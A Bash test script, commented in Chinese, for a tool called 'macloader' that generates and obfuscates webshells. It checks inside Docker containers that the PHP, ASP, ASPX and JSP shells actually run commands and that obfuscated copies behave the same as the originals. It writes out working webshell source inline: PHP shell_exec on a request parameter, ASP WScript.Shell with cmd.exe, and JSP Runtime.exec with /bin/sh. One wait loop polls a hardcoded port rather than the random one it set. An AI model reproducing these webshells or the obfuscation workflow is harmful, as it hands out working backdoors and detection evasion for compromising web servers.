#!/usr/bin/env bash
# =============================================================================
#  ws_docker_test.sh —— 在服务器上用真实语言环境验证生成的 webshell
#
#  为什么需要它: 生成的脚本"看起来对"不等于"能跑"。
#    PHP 的 \xNN 只在双引号里生效;
#    Java 的 \u000A 会在预处理阶段变成换行把字符串切断;
#    ASP 的单行 If 不能带 End If;
#    JSP 在 Linux Tomcat 上没有 cmd.exe。
#  这些坑只有真跑一遍才暴露得出来。
#
#  用法:
#    ./tools/ws_docker_test.sh [SSH_HOST]        # 默认 vps
#
#  依赖: 本机已构建 macloader; 服务器已装 docker 且能拉到镜像。
# =============================================================================
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BIN="$ROOT/src-tauri/target/release/macloader"
HOST="${1:-vps}"
REMOTE_DIR="/root/macloader_wstest"
LOCAL_TMP="$(mktemp -d)"
trap 'rm -rf "$LOCAL_TMP"' EXIT

pass=0; fail=0
ok()  { printf '  \033[32m[OK]\033[0m   %s\n' "$1"; pass=$((pass+1)); }
bad() { printf '  \033[31m[FAIL]\033[0m %s\n' "$1"; fail=$((fail+1)); }
warn(){ printf '  \033[33m[跳过]\033[0m %s\n' "$1"; }
head2(){ printf '\n\033[1m%s\033[0m\n' "$1"; }

if [ ! -x "$BIN" ]; then
  echo "缺少 macloader，先构建: cd src-tauri && cargo build --release"
  exit 1
fi
if ! ssh -o ConnectTimeout=10 -o BatchMode=yes "$HOST" true 2>/dev/null; then
  echo "连不上 $HOST"
  exit 1
fi

head2 "1. 生成样本"
# 每行: 语言 载荷类型
SPECS="php cmd
asp exec
aspx cmd
jsp sh"
echo "$SPECS" | while read -r lang kind; do
  [ -z "$lang" ] && continue
  if "$BIN" --cli --ws --ws-lang "$lang" --ws-password pass --ws-kind "$kind" \
      --out-dir "$LOCAL_TMP" --name "t_$lang" >/dev/null 2>&1; then
    ok "生成 $lang ($kind)"
  else
    bad "生成 $lang 失败"
  fi
done

head2 "2. 混淆已有脚本（各语言各一份）"
# 造 4 份"用户原有脚本"
printf '%s' '<?php
// 注释
if (isset($_REQUEST["pass"])) { echo "R:"; echo shell_exec($_REQUEST["pass"]); }
?>' > "$LOCAL_TMP/u_php.php"
printf '%s' '<%
Set s = CreateObject("WScript.Shell")
Response.Write "R:" & s.Exec("cmd.exe /c " & Request("pass")).StdOut.ReadAll
%>' > "$LOCAL_TMP/u_asp.asp"
printf '%s' '<%@ page import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("pass")});
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String l; while ((l = br.readLine()) != null) out.println("R:"+l);
%>' > "$LOCAL_TMP/u_jsp.jsp"
for lang in php asp jsp; do
  if "$BIN" --cli --wrap --wrap-src "$LOCAL_TMP/u_$lang.$( [ $lang = php ] && echo php || echo $lang )" \
      --wrap-lang "$lang" --out-dir "$LOCAL_TMP" --name "ob_$lang" >/dev/null 2>&1; then
    ok "混淆 $lang"
  else
    bad "混淆 $lang 失败"
  fi
done

head2 "3. 上传到服务器"
ssh "$HOST" "mkdir -p $REMOTE_DIR && rm -f $REMOTE_DIR/t_*" 
scp -q "$LOCAL_TMP"/t_*.php "$LOCAL_TMP"/t_*.asp \
       "$LOCAL_TMP"/t_*.aspx "$LOCAL_TMP"/t_*.jsp \
       "$LOCAL_TMP"/u_*.php "$LOCAL_TMP"/u_*.asp "$LOCAL_TMP"/u_*.jsp \
       "$LOCAL_TMP"/ob_*.php "$LOCAL_TMP"/ob_*.asp "$LOCAL_TMP"/ob_*.jsp \
       "$HOST:$REMOTE_DIR/" 2>/dev/null
ok "已上传"

# ---------- 通用测试包装：模拟 web 请求传入参数 ----------
cat > "$LOCAL_TMP/run.php" <<'EOF'
<?php
$_REQUEST[$argv[1]] = $argv[2];
include $argv[3];
EOF
scp -q "$LOCAL_TMP/run.php" "$HOST:$REMOTE_DIR/" 2>/dev/null

head2 "3. PHP 真实执行（命令是否真的跑起来）"
for ver in 8.2-cli 7.4-cli; do
  out="$(ssh "$HOST" "cd $REMOTE_DIR && docker run --rm -v $REMOTE_DIR:/t -w /t php:$ver \
        php -l t_php.php 2>&1 | tail -1")"
  case "$out" in
    *"No syntax errors"*) ok "PHP $ver 语法" ;;
    *) bad "PHP $ver 语法: $out" ;;
  esac

  out="$(ssh "$HOST" "cd $REMOTE_DIR && docker run --rm -v $REMOTE_DIR:/t -w /t php:$ver \
        php run.php pass id t_php.php 2>&1 | head -2")"
  case "$out" in
    *"uid="*) ok "PHP $ver 执行 id → $(echo "$out" | head -1)" ;;
    *) bad "PHP $ver 执行失败: $out" ;;
  esac
done

head2 "4. JSP 真实执行（Tomcat）"
TC_PORT=$((20000 + RANDOM % 20000))
ssh "$HOST" "docker rm -f ml_tc >/dev/null 2>&1; \
  docker run -d --name ml_tc -p $TC_PORT:8080 \
  -v $REMOTE_DIR:/usr/local/tomcat/webapps/ROOT tomcat:9-jdk17 >/dev/null 2>&1"
# 等 Tomcat 真正能响应（首次要解压 webapps，约 20-40 秒）
for i in $(seq 1 60); do
  code="$(ssh "$HOST" "curl -s -o /dev/null -w '%{http_code}' --max-time 3 http://127.0.0.1:18080/ 2>/dev/null")"
  [ "$code" = "200" ] || [ "$code" = "404" ] || [ "$code" = "403" ] && break
  sleep 2
done
# Tomcat 首次访问 JSP 要现场编译，在负载高的机器上可能要几十秒；
# 这里轮询到拿到非空响应或超时为止，而不是只试一次。
out=""
for i in $(seq 1 15); do
  out="$(ssh "$HOST" "curl -s --max-time 30 'http://127.0.0.1:$TC_PORT/t_jsp.jsp?pass=id' 2>&1 | tr -d '\n' | head -c 200")"
  [ -n "$out" ] && break
  sleep 4
done
case "$out" in
  *"uid="*) ok "JSP 执行 id → $(echo "$out" | grep -o 'uid=[^ ]*' | head -1)" ;;
  *) bad "JSP 执行失败: ${out:0:160}" ;;
esac
ssh "$HOST" "docker rm -f ml_tc >/dev/null 2>&1"

head2 "5. ASPX 语法（mono 编译 ASP.NET 页面代码）"
cat > "$LOCAL_TMP/aspx_extract.py" <<'PYEOF'
import re, sys
src = open(sys.argv[1]).read()
m = re.search(r'<script runat="server">(.*?)</script>', src, re.S)
if not m:
    sys.exit("no script block")
b = m.group(1).replace("Response.Write(", "W(")
stub = ("using System;\nusing System.Text;\nusing System.Diagnostics;\n"
        "using System.Collections.Specialized;\n"
        "public class Chk {\n"
        "  static NameValueCollection Request = new NameValueCollection();\n"
        "  static void W(string s) { }\n")
open(sys.argv[2], "w").write(stub + b + "\n}\n")
PYEOF
scp -q "$LOCAL_TMP/aspx_extract.py" "$HOST:$REMOTE_DIR/" 2>/dev/null
out="$(ssh "$HOST" "cd $REMOTE_DIR && python3 aspx_extract.py t_aspx.aspx chk.cs && \
  docker run --rm -v $REMOTE_DIR:/t -w /t mono:6.12 mcs -target:library -out:/tmp/c.dll chk.cs 2>&1 | tail -3")"
case "$out" in
  *"Compilation succeeded"*|"") ok "ASPX C# 编译通过" ;;
  *"error"*) bad "ASPX 编译失败: $out" ;;
  *) warn "ASPX: ${out:0:120}" ;;
esac

head2 "6. 混淆已有脚本：混淆前后功能必须一致"
# PHP：原文与混淆后都执行同一条命令，输出必须相同
for f in u_php.php ob_php.php; do :; done
php_out="$(ssh "$HOST" "cd $REMOTE_DIR && docker run --rm -v $REMOTE_DIR:/t -w /t php:8.2-cli php run.php pass id u_php.php 2>&1 | head -1")"
php_obf="$(ssh "$HOST" "cd $REMOTE_DIR && docker run --rm -v $REMOTE_DIR:/t -w /t php:8.2-cli php run.php pass id ob_php.php 2>&1 | head -1")"
if [ -n "$php_out" ] && [ "$php_out" = "$php_obf" ]; then
  ok "PHP 混淆前后输出一致 → $(echo "$php_out" | head -c 40)"
else
  bad "PHP 混淆前后不一致: [$php_out] vs [$php_obf]"
fi

# JSP：Tomcat 上对比
TC_PORT2=$((20000 + RANDOM % 20000))
ssh "$HOST" "docker rm -f ml_tcw >/dev/null 2>&1; docker run -d --name ml_tcw -p $TC_PORT2:8080 -v $REMOTE_DIR:/usr/local/tomcat/webapps/ROOT tomcat:9-jdk17 >/dev/null 2>&1"
for i in $(seq 1 40); do
  c="$(ssh "$HOST" "curl -s -o /dev/null -w '%{http_code}' --max-time 3 http://127.0.0.1:$TC_PORT2/ 2>/dev/null")"
  [ "$c" = "200" ] || [ "$c" = "404" ] && break
  sleep 2
done
j1=""; j2=""
for i in $(seq 1 15); do
  j1="$(ssh "$HOST" "curl -s --max-time 30 'http://127.0.0.1:$TC_PORT2/u_jsp.jsp?pass=id' 2>&1 | tr -d '\n' | head -c 60")"
  [ -n "$j1" ] && break
  sleep 4
done
for i in $(seq 1 15); do
  j2="$(ssh "$HOST" "curl -s --max-time 30 'http://127.0.0.1:$TC_PORT2/ob_jsp.jsp?pass=id' 2>&1 | tr -d '\n' | head -c 60")"
  [ -n "$j2" ] && break
  sleep 4
done
if [ -n "$j1" ] && [ "$j1" = "$j2" ]; then
  ok "JSP 混淆前后输出一致 → $(echo "$j1" | head -c 40)"
else
  bad "JSP 混淆前后不一致: [$j1] vs [$j2]"
fi
ssh "$HOST" "docker rm -f ml_tcw >/dev/null 2>&1"

head2 "7. ASP 结构校验（VBScript 无 Linux 引擎，做静态配对检查）"
cat > "$LOCAL_TMP/asp_check.py" <<'PYEOF'
import re, sys
s = open(sys.argv[1]).read()
# VBScript: Function/End Function、For/Next、块 If/End If 必须配对;
# 单行 If(Then 后有语句) 不需要 End If
# 注意: "End Function" 里也含 Function，必须按行首匹配，不能简单数单词
f_def = len(re.findall(r'(?im)^\s*Function\s+\w+', s))
f_end = len(re.findall(r'(?im)^\s*End\s+Function\b', s))
fr = len(re.findall(r'(?im)^\s*For\b', s)); nx = len(re.findall(r'(?im)^\s*Next\b', s))
block_if = sum(1 for l in s.splitlines()
               if re.search(r'\bIf\b.*\bThen\b\s*$', l, re.I))
end_if = len(re.findall(r'End If', s, re.I))
ok = (f_def == f_end and fr == nx and block_if == end_if)
print("Function %d/%d  For %d/%d  块If %d/EndIf %d" % (f_def, f_end, fr, nx, block_if, end_if))
# ASP 变量不带 $ 前缀
if "$" in s:
    print("FAIL: 出现 $ 前缀(VBScript 无此语法)"); sys.exit(1)
sys.exit(0 if ok else 1)
PYEOF
scp -q "$LOCAL_TMP/asp_check.py" "$HOST:$REMOTE_DIR/" 2>/dev/null
out="$(ssh "$HOST" "cd $REMOTE_DIR && python3 asp_check.py t_asp.asp 2>&1")"
if [ $? -eq 0 ]; then ok "ASP 结构配对正确 ($out)"; else bad "ASP 结构: $out"; fi

printf '\n'
if [ "$fail" -eq 0 ]; then
  printf '\033[32m✔ 全部通过\033[0m (%d 项)\n' "$pass"
  exit 0
fi
printf '\033[31m✘ %d 项失败\033[0m (%d 项通过)\n' "$fail" "$pass"
exit 1
